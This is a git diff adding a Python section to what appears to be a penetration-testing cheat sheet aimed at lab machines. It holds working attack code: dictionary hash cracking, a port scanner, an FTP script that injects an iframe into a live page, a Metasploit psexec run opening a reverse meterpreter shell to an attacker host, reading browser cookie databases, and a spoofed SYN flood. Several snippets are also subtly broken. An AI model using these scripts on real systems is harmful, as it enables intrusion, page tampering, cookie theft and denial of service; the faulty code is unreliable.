@@ -228,6 +228,176 @@ nc -lvnp 7777
 # Execute the socket 5 lines script to connect to netcat
 ```
 
+## Python Scripting
+
+### System Functions
+
+#### Crypt
+
+```python
+import crypt
+# Use crypt function by passing in a password and a salt
+crypt.crypt("secret","MS")
+# Will return a hash value
+```
+
+```python
+# Compare hash value from words in a file to a known hash
+import crypt
+import sys
+passfile=open('dict.txt', 'r')
+for word in passfile.readline():
+  if (crypt.crypt(word.strip(),"MS")==sys.argv[1]):
+    print("password is " + word)
+    
+# python ./getpass.py <hash value from before>
+```
+
+### Networking Functions
+
+#### socket
+
+```python
+# Retrieve the banner from a specified IP and Port
+import socket
+socket.setdefaulttimeout(1)
+s=socket.socket()
+s.connect_ex(("10.0.2.8",21))
+banner=s.recv(1024)
+s.close()
+print(banner)
+```
+
+```python
+# Port scanner for a range of ports specifying an IP as the argument
+import socket
+import sys
+try:
+  for i in range (1,1024);
+  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+  if s.connect_ex((sys.argv[1],i))=0:
+    print(sys.argv[1]+":"+str(i)+ " open"
+  s.close()
+except Exception, e:
+  pass
+```
+
+### Working with Websites
+
+#### ftplib
+
+```python
+import ftplib
+ftp=ftplib.FTP('10.0.2.8')
+ftp.login('msfadmin','msfadmin')
+ftp.cwd('/var/www/')
+ftp.dir()
+```
+
+#### urllib
+
+```python
+import urllib
+f=urllib.urlopen('http://10.0.2.8','index.php')
+print(f.read())
+```
+
+Using ftplib to execute a webinject
+
+```python
+import ftplib
+ftp=ftplib.FTP('10.0.2.8')
+ftp.login('msfadmin','msfadmin')
+ftp.cwd('/var/www/myacc')
+f=open('index.tmp'.'w')
+ftp.retrlines('RETR myacc.html',f.write)
+f.write('<iframe src="http://10.0.2.8/myacc/gotcha"></iframe>')
+f.close
+f=open('index.tmp','r')
+ftp.storlines('STORE myacc.html',f)
+f.close()
+ftp.close()
+print("Accounts page redirected to Gotcha site"
+```
+
+### Driving Metasploit through Python
+
+```python
+import os
+import sys
+def shell(metafile):
+  metafile.write('use exploit/multi/handler\n')
+  metafile.write('set payload windows/meterpreter/reverse_tcp\n')
+  metafile.write('set LHOST 10.0.2.11\n')
+  metafile.write('set LPORT 3000\n')
+  metafile.write('exploit -j z\n')
+  metafile.write('setg DisablePayloadHandler 1\n')
+
+def exploit(metafile):
+  metafile.write('use exploit/windows/smb/psexec\n')
+  metafile.write('set RHOST 10.0.2.6\n')
+  metafile.write('set SMBUser IEUser\n')
+  metafile.write('set SMBPass Passw0rd!\n')
+  metafile.write('set payload windows/meterpreter/reverse_tcp\n')
+  metafile.write('set LHOST 10.0.2.11\n')
+  metafile.write('set LPORT 3000\n')
+  metafile.write('exploit -j z\n')
+  
+metafile=open('meta.rc','w')
+shell(metafile)
+exploit(metafile)
+metafile.close()
+os.system('msfconsole -r meta.rc')
+```
+
+### Access SQLite Databases
+
+#### View tables of a database
+
+```python
+import sqlite3
+cs=sqlite3.connect('Cookies')  # Connect to a database called Cookies
+c=cs.cursor()
+c.execute('SELECT tbl_name FROM sqlite_master WHERE type==\"table\";')
+for row in c:
+  print(str(row))
+```
+
+#### View column/field names of a database table
+
+```python
+import sqlite3
+cs=sqlite3.connect('Cookies')
+c=cs.execute('SELECT * FROM cookies;')  # Get everything from cookies table of the Cookies DB
+for row in c.description:
+  print(row[0])
+```
+
+#### View table data
+
+```python
+import sqlite3
+cs=sqlite3.connect('Cookies')
+c=cs.cursor()
+c.execute('SELECT host_key,name FROM cookies;')  # Get host_key and name field values from the cookies table
+for row in c:
+  print(row[1].ljust(16)+' '+row[0])
+```
+
+### Scapy
+
+Using scapy to create a SYN flood
+
+```python
+from scapy.all import *
+def flood (src,tgt):
+  for port in range(1024,65536):
+    send(IP(src=src,dst=tgt)/TCP(sport=port, dport=4444, flags="5"))
+source='10.0.2.99"
+target="10.0.2.8"
+flood(source,target)
+```
+
 ## Scripts
 
 ### Port Scanner
